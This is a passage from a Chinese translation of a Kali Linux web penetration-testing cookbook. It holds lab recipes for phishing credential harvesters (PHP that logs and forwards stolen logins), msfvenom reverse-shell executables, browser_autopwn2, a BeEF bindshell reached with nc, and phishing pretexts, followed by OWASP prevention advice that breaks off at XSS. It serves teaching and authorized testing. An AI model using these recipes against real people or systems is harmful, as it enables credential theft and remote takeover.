# Kali Linux Web 渗透测试秘籍（三）

> 译者：[飞龙](https://github.com/wizardforcel)

# 第九章：客户端攻击和社会工程

> 作者：Gilberto Najera-Gutierrez

> 译者：[飞龙](https://github.com/)

> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

## 简介

我们目前所见的大部分技巧都尝试利用服务端的漏洞或设计缺陷，并访问它来从数据库中提取信息。有另外一种攻击，使用服务器来利用用户软件上的漏洞，或者尝试欺骗用户来做一些他们通常情况下不会做的事情，以便获得用户拥有的信息。这些攻击就叫做客户端攻击。

这一章中，我们会复查一些由攻击者使用，用于从客户端获得信息的技巧，通过社会工程、欺骗或利用软件漏洞。

虽然它并不和 Web 应用渗透测试特定相关，我们会涉及它们，因为大多数都是基于 web 的，并且都是非常常见的场景，其中我们在攻击客户端时，能够访问应用和服务器。所以，了解攻击者如何执行这类攻击，对于渗透测试者来说非常重要。

## 9.1 使用 SET 创建密码收集器

社会工程攻击可能被认为是客户端攻击的特殊形式。在这种攻击中，攻击者需要说服用户，相信攻击者是可信任的副本，并且有权接收用户拥有的一些信息。

SET 或社会工程工具包（`https://www.trustedsec.com/social-engineertoolkit/`）是一套工具，为执行针对人性的攻击而设计。这类攻击，包括网络钓鱼、邮件群发、SMS、伪造无线接入点、恶意网站、感染性媒体，以及其它。

这个秘籍中，我们会使用 SET 来创建密码收集器网页，并看看它如何工作，以及攻击者如何使用它来盗取用户密码。

### 操作步骤

1.  在 root 终端中输入下列命令：

    ```
    setoolkit
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/9-1-1.jpg)
    
2.  在`set>`提示符中输入`1`（`Social-Engineering Attacks`）并按下回车。

3.  现在选择`Website Attack Vectors`（选项`2`）。

4.  从下面的菜单中，我们选择`Credential Harvester Attack Method`（选项`3`）。

5.  选择`Site Cloner `（选项`2`）。

6.  它会询问`IP address for the POST back in Harvester/Tabnabbing`。它的意思是收集到的证书打算发送到哪个 IP。这里，我们输入 Kali 主机在`vboxnet0`中的 IP `192.168.56.1`。

7.  下面，压脚询问要克隆的 URL，我们会从 vulnerable_vm 中克隆 Peruggia 的登录表单。输入` http://192.168.56.102/peruggia/index. php?action=login`。

8.  现在会开始克隆，之后你会被询问是否 SET 要开启 Apache 服务器，让我们这次选择`Yes`，输入`y`并按下回车。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/9-1-2.jpg)
    
9.  再次按下回车。

0.  让我们测试一下页面，访问` http://192.168.56.1/`。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/9-1-3.jpg)
    
    现在我们拥有原始登录页面的一份精确副本。
    
1.  现在在里面输入一些用户名和密码，并点击`Login`。我们要尝试`harvester/test`。

2.  你会看到页面重定向到了原始的登录页面。现在，来到终端并输入收集器文件保存的目录，默认为 Kali 中的`/var/www/ html`：

    ```
    cd /var/www/html
    ```
    
3.  这里应该有名称为`harvester_{date and time}.txt `的文件。

4.  显示它的内容，我们会看到所有捕获的信息：

    ```
    cat harvester_2015-11-22 23:16:24.182192.txt
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/9-1-4.jpg)
    
    这就结束了，我们仅仅需要将连接发送给我们的目标，并让他们访问我们的伪造登录页面，来收集它们的密码。
    
### 工作原理

SET 在克隆站点的时候会创建三个文件：首先是`index.html`，这是原始页面的副本，并包含登录表单。如果我们查看 SET 在我们的 Kali 中的 `/var/www/html `创建的`index.html`的代码，我们会发现下面的代码：

```html
<form action="http://192.168.56.1/post.php" method=post> 
<br> 
Username: <input type=text name=username><br> 
Password: <input type=password name=password><br> 
<br><input type=submit value=Login><br> 
</form>
```

这里我们可以看到用户名和密码都发给了 192.168.56.1 （我们的 Kali 主机）的`post.php`，这是 SET 创建的第二个文件。这个文件所做的所有事情就是读取 POST 请求的内容并将它们写入`harvester_{date and time}.txt `文件。 SET 所创建的第三个文件储存由用户提交的信息。在向文件中写入数据之后，`<meta>`标签重定向到原始的登录页面，所以用户会认为他们输入了一些不正确的用户名或密码：

```php
<?php 
$file = 'harvester_2015-11-22 23:16:24.182192.txt'; 
file_put_contents($file, print_r($_POST, true), FILE_APPEND); 
?> 
<meta http-equiv="refresh" content="0; 
url=http://192.168.56.102/peruggia/index.php?action=login" 
/>
```

## 9.2 使用之前保存的页面来创建钓鱼网站

在之前的秘籍中，我们使用了 SET 来复制网站并使用它来收集密码。有时候，仅仅复制登录页面不会对高级用户生效，在正确输入密码并再次重定向登录页面时，它们可能会产生怀疑，或者会试着浏览页面中的其它链接。我们这样就会失去它们，因为它们会离开我们的页面而来到原始站点。

这个秘籍中，我们会使用我们在第三章“为 Wget 离线分析下载页面”秘籍中复制的页面，来构建更加详细的钓鱼网站，因为它几乎含有所有导航，并且会在捕获证书之后登陆原始站点。

### 准备

我们需要保存 Web 页面，遵循第三章“为 Wget 离线分析下载页面”秘籍。简单来说，可以通过下列命令来完成：

```
wget -r -P bodgeit_offline/ http://192.168.56.102/bodgeit/ 
```

之后，离线页面会储存在`bodgeit_offline `目录中。

### 操作步骤

1.  第一步是将下载的站点复制到 Kali 中 APache 的根目录。在 root 终端中：

    ```
    cp -r bodgeit_offline/192.168.56.102/bodgeit /var/www/html/ 
    ```
    
2.  之后我们启动 Apache 服务：

    ```
    service apache2 start 
    ```
    
3.  下面，我们需要更新我们的登录页面，使它重定向我们收集密码的脚本。打开`bodgeit `目录（`/ var/www/html/bodgeit`）中的`login.jsp`文件，并寻找下面的代码：

    ```html
    <h3>Login</h3> 
    Please enter your credentials: <br/><br/> 
    <form method="POST">
    ```
    
4.  现在，在表单标签中添加`action`来调用`post.php`：

    ```html
    <form method="POST" action="post.php">
    ```
    
5.  我们需要在` login.jsp `的相同目录下创建该文件，创建`post.php`，带有下列代码：

    ```php
    <?php  
    $file = 'passwords_C00kb00k.txt';  
    file_put_contents($file, print_r($_POST, true), FILE_APPEND);  
    $username=$_POST["username"];  
    $password=$_POST["password"];  
    $submit="Login"; ?> 
    <body onload="frm1.submit.click()"> 
    <form name="frm1" id="frm1" method="POST" 
    action="http://192.168.56.102/bodgeit/login.jsp"> 
    <input type="hidden" value="<?php echo $username;?>" name ="username"> 
    <input type="hidden" value="<?php echo $password;?>" name ="password"> 
    <input type="submit" value="<?php echo $submit;?>" name ="submit"> 
    </form> 
    </body>
    ```
    
6.  你可以看到，密码会保存到` passwords_C00kb00k.txt`。我们需要创建这个文件来设置合理的权限。在 root 终端中访问`/var/www/html/bodgeit `，并输入下列命令：

    ```
    touch passwords_C00kb00k.txt 
    chown www-data passwords_C00kb00k.txt
    ```
    
    要记住 Web 服务器运行在 www-data 用户下，所以我们需要使这个用户为文件的所有者，便于它可被 web 服务器进程写入。
    
7.  现在，是时候让受害者访问这个站点了，假设我们让用户访问了`http://192.168.56.1/bodgeit/login.jsp`，打开浏览器并访问它。

8.  使用一些有效用户信息填充登录表单，对于这个秘籍我们会使用`user@ mail.com/password`。

9.  点击`Login`。
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/9-2-1.jpg)
    
    它看起来能正常工作，我们现在成功登录了` 192.168.56.102`。
    
0.  让我们检查密码文件，在终端中输入：

    ```
    cat passwords_C00kb00k.txt
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/9-2-2.jpg)
    
    并且，我们得到它了。我们捕获了用户的密码，将它们重定向到正常页面并执行了登录。
    
### 工作原理

这个秘籍中，我们使用了站点副本来创建密码收集器，并使它更加可信，我们使脚本执行原始站点的登录。

在前三步中，我们简单设置了 Web 服务器和它要展示的文件。下面，我们创建了密码收集器脚本`post.php`：前两行和之前的秘籍相同，它接受所有 POST 参数并保存到文件中。

```php
$file = 'passwords_C00kb00k.txt';  
file_put_contents($file, print_r($_POST, true), FILE_APPEND);
```

之后我们将每个参数储存到变量中：

```php
$username=$_POST["username"];  
$password=$_POST["password"];  
$submit="Login";
```

因为我们的登录不打算依赖于用户发送的正确值，我们设置`$submit="Login"`。下面，我们创建了 HTML 主题，它包含一个表单，在页面加载完毕后会自动发送`username`，`password`和`submit`值到原始站点。

```php
<body onload="frm1.submit.click()"> 
<form name="frm1" id="frm1" method="POST" 
action="http://192.168.56.102/bodgeit/login.jsp"> 
<input type="hidden" value="<?php echo $username;?>" name ="username"> 
<input type="hidden" value="<?php echo $password;?>" name ="password"> 
<input type="submit" value="<?php echo $submit;?>" name ="submit"> 
</form> 
</body>
```

要注意，`body `中的`onload`事件并不调用`frm1.submit() `而是` frm1.submit. click()`。这是因为当我们使用`submit`作为表单元素的名称时，表单中的`submit()`函数会被这个元素覆盖掉（这里是提交按钮）。我们并不打算修改按钮名称，因为它是原始站点需要的名称。所以我们使`submit`变成一个按钮，而不是隐藏字段，并使用它的`click`函数将值提交到原始站点。我们同时将表单中的字段值设置为我们之前用于储存用户数据的变量值。

## 9.3 使用 Metasploit 创建反向 shell 并捕获连接

当我们执行客户端攻击的时候，我们能够欺骗用户来执行程序，并使这些程序连接回控制端。

这个秘籍中，我们会了解如何使用 Metasploit 的 msfvenom 来创建可执行程序（反向 meterpreter shell），它会在执行时连接我们的 Kali 主机，并向我们提供用户计算机的控制。

### 操作步骤

1.  首先，我们要创建我们的 shell。在 Kali 中打开终端并执行下列命令：

    ```
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4443 -f exe > cute_dolphin.exe
    ```
    
    这会创建名为`cute_dolphin.exe`的文件，这是反向 meterpreter shell，反向意味着它会连接回我们，而不是监听我们的连接。
    
2.  下面，我们需要为我们“可爱的海豚”将要创建的连接建立监听器。在 MSFconsole 的终端中：

    ```
    use exploit/multi/handler 
    set payload windows/meterpreter/reverse_tcp 
    set lhost 192.168.56.1 set lport 4443 
    set ExitOnSession false 
    set AutorunScript post/windows/manage/smart_migrate 
    exploit -j -z 
    ```
    
    就像你看到的那样，LHOST 和 RPORT 是我们用于创建`exe`文件的东西。这是程序将要连接的 IP 地址和 TCP 端口。所以我们需要在这个 Kali 的网络接口和端口上监听。
    
3.  我们的 Kali 已准备就绪，现在是准备攻击用户的时候了，我们以 root 启动 Apache 服务并运行下列代码：

    ```
    service apache2 start
    ```
    
4.  之后，将恶意文件复制到 web 服务器文件夹内。

    ```
    cp cute_dolphin.exe /var/www/html/
    ```
    
5.  假设我们使用社会工程并使我们的受害者相信这个文件是需要执行来获得一些好处的东西。在 Windows 客户端虚拟机内，访问` http://192.168.56.1/cute_dolphin.exe`。

6.  你会被询问下载还是运行这个文件，出于测试目的，选择`Run`（运行），再被询问时，再次选择`Run`。

7.  现在，在 Kali MSFCONSOLE 的终端中，你会看到建立好的连接：

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/9-3-1.jpg)

8.  我们在后台运行连接处理器（`-j -z`选项）。让我们检查我们的活动会话：

    ```
    sessions
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/9-3-2.jpg)
    
9.  如果我们打算和会话交互，可以使用`-i`选项，带有会话的编号：

    ```
    sessions -i 1 
    ```
    
0.  我们会看到 meterpreter 的提示符。现在，我们可以请求被入侵系统的信息。

    ```
    sysinfo
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/9-3-3.jpg)
    
1.  或者执行系统 shell。

    ```
    shell
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/9-3-4.jpg)

### 工作原理

Msfvenom 帮助的我们从 Metasploit 大量列表中创建载荷，并且将它们集成到许多语言的源代码中，或者创建脚本和可执行文件。就像我们在这个秘籍所做的那样。我们这里所使用的参数是所使用的载荷（`windows/ meterpreter/reverse_tcp`）、连接回来所需的主机和端口（LHOST 和 RPORT），以及输出格式（`-f exe`）。将标准输出重定向到文件来将它保存为` cute_dolphin.exe`。

Metasploit 的 exploit/multi/handler 是个载荷处理器，这里我们将其用于监听连接。在连接建立之后，它执行了 meterpreter 载荷。

Meterpreter 是增强型的 Metasploit shell。它包含用于嗅探受害者网络，用于将其作为入口来访问本地网络，或者用于执行权限提升和密码提取的模块，以及其它渗透测试中的实用工具。

## 9.4 使用 Metasploit 的 browser_autpwn2 攻击客户端

Metasploit 框架包含客户端利用的庞大集合，许多都为利用浏览器中的已知漏洞而设计。其中有一个模块能够检测客户端所使用的浏览器版本，并挑选最好的利用工具来触发漏洞。这个模块是 browser_autpwn 和 browser_autpwn2，后者是最新版本。

在这个秘籍中，我们会使用 browser_autpwn2 执行攻击，并将其配置好来让目标访问。

### 操作步骤

1.  启动 MSFCONSOLE。

2.  我们会使用 browser_autpwn2 （BAP2）。

    ```
    use auxiliary/server/browser_autopwn2 
    ```

3.  让我们看一看它拥有什么配置项。

    ```
    show options
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/9-4-1.jpg)
    
4.  我们将 Kali 设为接受连接的主机。

    ```
    set SRVHOST 192.168.56.1
    ```
    
5.  之后，我们为接受响应的服务器创建目录`/kittens`。

    ```
    set URIPATH /kittens
    ```
    
6.  这个模块会触发大量利用，包含一些 Android 上的。假设我们的攻击目标是 PC，并不打算依赖于 Adobe Flash 的授权。我们会排除 Android 和 Flash 的利用。

    ```
    set EXCLUDE_PATTERN android|adobe_flash
    ```
    
7.  我们也可以设置模块的高级选项（使用`show advanced`来查看高级选项的完整列表），来向我们展示每个加载的利用的独立路径，并且更加详细。

    ```
    set ShowExploitList true 
    set VERBOSE true
    ```
    
    高级选项也允许我们为每个平台（Windows、Unix 和 Android）选择载荷和它的参数，例如 LHOST 和 RPORT。
    
8.  现在，我们已经为执行利用做好了准备。

    ```
    run
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/9-4-2.jpg)
    
    如果我们打算触发特定的利用，我们可以在服务器的 URL 后面使用`Path`值。例如，如果我们打算触发`firefox_svg_plugin`，我们将`http://192.168.56.1/PWrmfJApkwWsf`发送给受害者，路径在每次模块运行时会随机生成。
    
9.  在客户端的浏览器中，如果我们访问` http://192.168.56.1/kittens`，我们会看到 BAP2 立即响应，并且尝试所有合适的利用，当它成功执行某个之后，它会在后台创建会话：

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/9-4-3.jpg)
    
### 工作原理

Browser Autopwn 会建立带有主页的 Web 服务器，并使用 JavaScript 来识别客户端运行了什么软件，并基于它选择合适的利用来尝试。

这个秘籍中，我们设置了 Kali 主机，使其为`kittens`目录的请求监听 8080 端口。我们所配置的其它请求是：

+   `EXCLUDE_PATTERN`：告诉 BAP2 排除（不加载） Android 浏览器或 Flash 插件的利用。

+   `ShowExploitList`：展示 BAP2 运行时已加载的利用。

+   `VERBOSE`：告诉 BPA2 显示更多信息，关于加载了什么，加载到哪里，每一步都发生了什么。

之后，我们只需要运行模块并使一些用户访问我们的`/kittens `站点。

## 9.5 使用 BeEF 攻击

在之前的章节中，我们看到了 BeEF（浏览器利用框架）能够做什么。这个秘籍中，我们会使用它来发送而已浏览器扩展，当它执行时，会向我们提供绑定到系统的远程 shell。

### 准备

我们需要为这个秘籍在 Windows 客户端安装 Firefox。

### 操作步骤

1.  开启 BeEF 服务。在 root 终端下，输入下列命令：

    ```
    cd /usr/share/beef-xss/ 
    ./beef
    ```
    
2.  我们会使用 BeEF 的高级演示页面来勾住我们的客户端。在 Windows 客户端 VM 中，打开 FIrefox 并浏览`http://192.168.56.1:3000/demos/butcher/index.html`。

3.  现在，登录 BeEF 的面板（`http://127.0.0.1:3000/ui/panel`）。我们必须在这里查看新勾住的浏览器。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/9-5-1.jpg)
    
4.  选项被勾住的 FIrefox 并访问` Current Browser | Commands | Social Engineering | Firefox Extension (Bindshell)`。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/9-5-2.jpg)
    
    由于它被标为橙色（命令模块对目标工作，但是可能对用户可见），我们可能需要利用社会工程来使用户接受扩展。
    
5.  我们需要发送叫做`HTML5 Rendering Enhancements`的扩展给用户，它会通过 1337 端口打开 shell。点击`Execute`来加载攻击。

6.  在客户端，Firefox 会询问许可来安装插件并接受它。

7.  之后，如果 Windows 防火墙打开了，它会询问许可来让插件访问网络，选择`Allow access `。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/9-5-3.jpg)
    
    最后两个步骤高度依赖于社会工程，说服用户信任这个插件值得安装和授权。
    
8.  现在，我们应该拥有了等待连接 1337 端口的的客户端。在 Kali 中打开终端并连接到它（我们这里是 192.168.56.102）。

    ```
    nc 192.168.56.102 1337
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/9-5-4.jpg)
    
    现在我们就连接到了客户端并能够在里面执行命令。
    
### 工作原理

一旦客户端被 BeEF 勾住，它就会像浏览器发送请求（通过`hook.js`）来下载扩展。一旦下载完成，就取决于用户是否安装。

像之前所说的那样，这个攻击高度依赖用户来完成关键步骤，这取决于我们通过社会工程手段说服用户，使之相信必须安装扩展。这可以通过页面上的文本来完成，比如说解锁一些浏览器的实用功能非常必要。

在用户安装扩展之后，我们只需要使用 Netcat 来连接端口 1337，并开始执行命令。

## 9.6 诱使用户访问我们的仿造站点

每次社会工程攻击的成功依赖于攻击者说服用户的能力，以及用户遵循攻击者指令的意愿。这个秘籍是一系列攻击者所使用的情景和技巧，用于利用它们的优势使用户更加信任并抓住它们。

这一节中，我们会看到一些在前面那些安全评估中能够生效的攻击。它们针对拥有一定等级的安全意识，并且不会陷入“银行账户更新”骗局的用户。

1.  做你自己的作业：如果是个钓鱼攻击，做一次关于目标的彻底调查：社会网络、论坛、博客、以及任何能够告诉你目标信息的信息员。Maltego 包含在 Kali 中，可能是用于这个任务的最佳工具。之后基于这些编造一个借口（伪造的故事）或者一个攻击主题。

    我们发现了一些客户的雇员，他们在 Facebook 主页上发送大量图片、视频和文本。我们从她的页面上收集了一些内容并构建了幻灯片演示，它也包含客户电脑的远程执行利用，我们将它通过邮件发送她。

2.  创建争论：如果目标是个某领域中的意见领袖，使用他自己的名言，使它们对你说的东西感兴趣，这也会有帮助。

    我们被雇佣来执行某个金融公司的渗透测试，协约条款包括了社会工程。我们的目标是个经济和金融圈内的知名人士。他在知名的杂志上撰稿，做讲座，出现在经济新闻上，以及其它。我们的团队做了一些关于他的研究，并从经济杂志的网站上获得了一篇文章。这篇文章包含他的公司（我们的客户）的电子邮件。我们寻找了关于文章的更多信息，并发现其它站点上的一些评论和引用。我们利用这些杜撰了一个电子邮件，说我们有一些关于文章的评论，在消息中给出摘要，并使用短链接来链接到 Google Drive 的一个文档上。
    
    短链接让用户访问伪造的 Google 登录页面，它由我们控制，并允许我们获取他同事的邮件和密码。
    
3.  说出你是谁：好吧，这并不准确。如果你说“我是个安全研究员，在你的系统中发现了一些东西”，可能对于开发者和系统管理员是个很好的钩子。

    在其它场景中，我们需要明确公司中的社会工程师和系统管理员。首先，我们不能在网上发现任何关于他的有用信息，但是可以在公司的网站上发现一些漏洞。我们使用它来向我们的目标发送邮件，并说我们在公司的服务器上发现了一些重要的漏洞，我们可以帮你修复它们，附上一张图作为证据，以及 Google Drive 文档的链接（另一个伪造登录页面）。
    
4.  固执与逼迫：有时候你不会在首次尝试的时候就收到答复，这时总是要分析结果 -- 目标是否点击了链接，目标是否提交了伪造信息，以及判断是否要做出第二次尝试。

    我们没有从系统管理员那里收到该场景的答复，页面也没有人浏览。所以我们发送第二个邮件，带有 PDF “完整报告”，并说如果我们没有收到答复，就公布漏洞。于是我们收到了答复。
    
5.  使你自己更加可信：尝试接受一些你模仿的人的修辞，并提供一些真实信息。如果你向公司发送邮件，使用公司的 Logo，为你的伪造站点获得一个免费的`.tk`或`.co.nf`域名，花费一些时间来设计或正确复制目标站点，以及其它。

    盗取信用卡数据的人所使用的技巧非常通用，它们使用信用卡号码的一部分，后面带有星号，发送“你需要更新你的信息”邮件（的变体）。

    正常信息会这样写：“你的信用卡 `**** **** **** 3241` 的信息”，但是伪造信息会这样写：“你的信用卡 `4916 **** **** ****` 的信息”。要知道前四位（4916）是 Visa 信用卡的标准。
    
### 工作原理

让一个人打开来自完全陌生的人的邮件，阅读它，并点击它包含的链接，以及提供页面上的所需信息，在尼日利亚王子诈骗横行的今天，可能是一件非常困难的事情。成功社会工程攻击的关键是创造一种感觉，让受害者觉得攻击者在为它做一些好事或必要的事情，也要创造一种急迫感，即用户必须快速回复否则会丢失重要的机会。

### 更多

客户端攻击也可以用于被入侵服务器上的提权。如果你获得了服务器的访问，但是没有继续行动的空间，你可能需要在你的攻击主机上开启而已服务器，并在目标上浏览它。所以你可以利用其它类型的漏洞，并执行特权命令。


# 第十章：OWASP Top 10 的预防

> 作者：Gilberto Najera-Gutierrez

> 译者：[飞龙](https://github.com/)

> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

## 简介

每个渗透测试的目标都是识别应用、服务器或网络中的可能缺陷，它们能够让攻击者有机会获得敏感系统的信息或访问权限。检测这类漏洞的原因不仅仅是了解它们的存在以及推断出其中的漏洞，也是为了努力预防它们或者将它们降至最小。

这一章中，我们会观察一些如何预防多数 Web 应用漏洞的例子和推荐，根据 OWASP：

https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project 

## A1 预防注入攻击

根据 OWASP，Web 应用中发现的最关键的漏洞类型就是一些代码的注入攻击，例如 SQL 注入、OS 命令注入、HTML 注入（XSS）。

这些漏洞通常由应用的弱输入校验导致。这个秘籍中，我们会设计一些处理用户输入和构造所使用的请求的最佳实践。

### 操作步骤

1.  为了防止注入攻击，首先需要合理校验输入。在服务端，这可以由编写我们自己的校验流程来实现，但是最佳选择是使用语言自己的校验流程，因为它们更加广泛使用并测试过。一个极好的激励就是 PHP 中的` filter_var `，或者 ASP.NET 中的 校验助手。例如，PHP 中的邮箱校验类似于：

    ```php
    function isValidEmail($email){ 
        return filter_var($email, FILTER_VALIDATE_EMAIL); 
    }
    ```
    
2.  在客户端，检验可以由创建 JavaScript 校验函数来完成，使用正则表达式。例如，邮箱检验流程是：

    ```js
    function isValidEmail (input) { 
        var result=false; 
        var email_regex = /^[a-zA-Z0-9._-]+@([a-zA-Z0-9.-]+\.)+[azA-Z0-9.-]{2,4}$/; 
        if ( email_regex.test(input) ) {  
            result = true; 
        } 
        return result; 
    }
    ```
    
3.  对于 SQL 注入，避免拼接输入值为查询十分关键。反之，使用参数化查询。每个编程语言都有其自己的版本：

    PHP MySQLLi：

    ```php
    $query = $dbConnection->prepare('SELECT * FROM table WHERE name = ?'); 
    $query->bind_param('s', $name); 
    $query->execute(); 
    ```
    
    C#：
    
    ```csharp
    string sql = "SELECT * FROM Customers WHERE CustomerId = @ CustomerId"; 
    SqlCommand command = new SqlCommand(sql); command.Parameters.Add(new SqlParameter("@CustomerId", System. Data.SqlDbType.Int)); 
    command.Parameters["@CustomerId"].Value = 1; 
    ```
    
    Java：
    
    ```java
    String custname = request.getParameter("customerName"); 
    String query = "SELECT account_balance FROM user_data WHERE user_ name =? ";  
    PreparedStatement pstmt = connection.prepareStatement( query ); 
    pstmt.setString( 1, custname); 
    ResultSet results = pstmt.executeQuery( ); 
    ```
    
4.  考虑注入出现的时机，对减少可能的损失总量也有帮助。所以，使用低权限的系统用户来运行数据库和 Web 服务器。

5.  确保输入用于连接数据库服务器的用户不是数据库管理员。

6.  禁用甚至删除允许攻击者执行系统命令或提权的储存过程，例如 MSSQL 服务器中的`xp_cmdshell `。

### 工作原理

预防任何类型代码注入攻击的主要部分永远是合理的输入校验，位于服务端也位于客户端。

对于 SQL 注入，始终使用参数化或者预编译查询。而不是拼接 SQL 语句和输入。参数化查询将函数参数插入到 SQL 语句特定的位置，消除了程序员通过拼接构造查询的需求。

这个秘籍中，我们使用了语言内建的校验函数，但是如果你需要校验一些特殊类型的参数，你可以通过使用正则表达式创建自己的版本。

除了执行正确校验，我们也需要在一些人蓄意注入一些代码的情况下，降低沦陷的影响。这可以通过在操作系统的上下文中为 Web 服务器合理配置用户权限，以及在数据库服务器上下文中配置数据库和 OS 来实现。

### 另见

对于数据校验来讲，最有用的工具就是正则表达式。在处理和过滤大量信息的时候，它们也能够让渗透测试变得更容易。所以好好了解它们很有必要。我推荐你查看一些站点：

+   http://www.regexr.com/ 一个很好的站点，其中我们可以获得示例和参数并测试我们自己的表达式来查看是否有字符串匹配。

+   http://www.regular-expressions.info 它包含教程和实例来了解如何使用正则表达式。它也有一份实用的参考，关于主流语言和工具的特定实现。

+   http://www.princeton.edu/~mlovett/reference/Regular-Expressions.pdf （Jan Goyvaerts 编写的《Regular Expressions, The Complete Tutorial》）就像它的标题所说，它是个正则表达式的非常完备的脚本，包含许多语言的示例。

## A2 构建合理的身份验证和会话管理

带有缺陷的身份验证和会话管理是当今 Web 应用中的第二大关键的漏洞。

身份验证是用户证明它们是它们所说的人的过程。这通常通过用户名和密码来完成。一些该领域的常见缺陷是宽松的密码策略，以及隐藏式的安全（隐藏资源缺乏身份验证）。

会话管理是登录用户的会话标识符的处理。在 Web 服务器中，这可以通过实现会话 Cookie 和标识来完成。这些标识符可以植入、盗取，或者由攻击者使用社会工程、XSS 或 CSRF 来“劫持”。所以，开发者必须特别注意如何管理这些信息。

这个秘籍中，我们会设计到一些实现用户名/密码身份验证，以及管理登录用户的会话标识符的最佳实践。

### 操作步骤

1.  如果应用中存在只能由授权用户查看的页面、表单或者任何信息片段，确保在展示它们之前存在合理的身份验证。

2.  确保用户名、ID、密码和所有其它身份验证数据是大小写敏感的，并且对每个用户唯一。

3.  建立强密码策略，强迫用户创建至少满足下列条件的密码：

    +   对于 8 个字符，推荐 10 个。
    +   使用大写和小写字母。
    +   至少使用一个数字。
    +   至少使用一个特殊字符（空格、` !`、`&`、`#`、`%`，以及其它）。
    +   禁止用户名、站点名称、公司名称或者它们的变体（大小写转换、l33t、它们的片段）用于密码。
    +   禁止使用“常见密码”列表中的密码：https://www.teamsid.com/worst-passwords-2015/ 。
    +   永远不要显示用户是否存在或者信息格式是否正确的错误信息。对不正确的登录请求、不存在的用户、名称或密码不匹配模式、以及所有可能的登录错误使用相同的泛化信息。这种信息类似于：
    
        登录数据不正确。
        
        用户名或密码无效。
        
        访问禁止。
        
4.  密码不能以纯文本格式储存在数据库中。使用强哈希算法，例如 SHA-2、scrypt、或者 bcrypt，它们特别为难以使用 GPU 破解而设计。

5.  在对比用户输入和密码时，计算输入的哈希之后比较哈希之后的字符串。永远不要解密密码来使用纯文本用户输入来比较。

6.  避免基本的 HTML 身份验证。

7.  可能的话，使用多因素验证（MFA），这意味着使用不止一个身份验证因素来登录：

    +   一些你知道的（账户信息或密码）
    
    +   一些你拥有的（标识或手机号）
    
    +   一些你的特征（生物计量）
    
8.  如果可能的话，实现证书、预共享密钥、或其它无需密码的身份校验协议（OAuth2、OpenID、SAML、或者 FIDO）。

9.  对于会话管理，推荐使用语言内建的会话管理系统，Java、ASP.NET 和 PHP。它们并不完美，但是能够确保提供设计良好和广泛测试的机制，而且比起开发团队在时间紧迫情况下的自制版本，它们更易于实现。

0.  始终为登录和登录后的页面使用 HTTPS -- 显然，要防止只接受 SSL 和 TLS v1.1 连接。

1.  为了确保 HTTPS 能够生效，可以使用 HSTS。它是由 Web 应用指定的双向选择的特性。通过 Strict-Transport-Security 协议头，它在 `http://`存在于 URL 的情况下会重定向到安全的选项，并防止“无效证书”信息的覆写。例如使用 Burp Suite 的时候会出现的情况。更多信息请见： https://www.owasp.org/index.php/HTTP_Strict_Transport_Security 。

2.  始终设置 HTTPOnly 和安全的 Cookie 属性。

3.  设置最少但实际的会话过期时间。确保正常用户离开之后，攻击者不能复用会话，并且用户能够执行应用打算执行的操作。

### 工作原理

身份校验机制通常在 Web 应用中简化为用户名/密码登录页面。虽然并不是最安全的选择，但它对于用户和开发者最简单，以及当密码被盗取时，最重要的层面就是它们的强度。

我们可以从这本书看到，密码强度由破解难度决定，通过爆破、字典或猜测。这个秘籍的第一个提示是为了使密码更难以通过建立最小长度的混合字符集来破解，难以通过排除更直觉的方案（用户名、常见密码、公司名称）来猜测，并且通过使用强哈希或加密储存，难以在泄露之后破解。

对于会话管理来说，过期时间、唯一性和会话 ID 的强度（已经在语言内建机制中实现），以及 Cookie 设置中的安全都是关键的考虑因素。

谈论身份校验安全的最重要的层面是，如果消息可以通过中间人攻击拦截或者服务，没有任何安全配置、控制或强密码是足够安全的。所以，合理配置的加密通信频道的使用，例如 TLS，对保护我们的用户身份数据来说极其重要。

### 另见

OWASP 拥有一些非常好的页面，关于身份校验和会话管理。我们推荐你在构建和配置 Web 应用时阅读并仔细考虑它们。

+   https://www.owasp.org/index.php/Authentication_Cheat_Sheet
+   https://www.owasp.org/index.php/Session_Management_Cheat_Sheet

## A3 预防跨站脚本

我们之前看到，跨站脚本，在展示给用户的数据没有正确编码，并且浏览器将其解释并执行为脚本代码时发生。这也存在输入校验因素，因为恶意代码通常由输入变量插入。

这个秘籍中，我们会涉及开发者所需的输入校验和输出编码，来防止应用中的 XSS 漏洞。

### 工作原理

1.  应用存在 XSS 漏洞的第一个标志是，页面准确反映了用户提供的输入。所以，尝试不要使用用户提供的信息来构建输出文本。

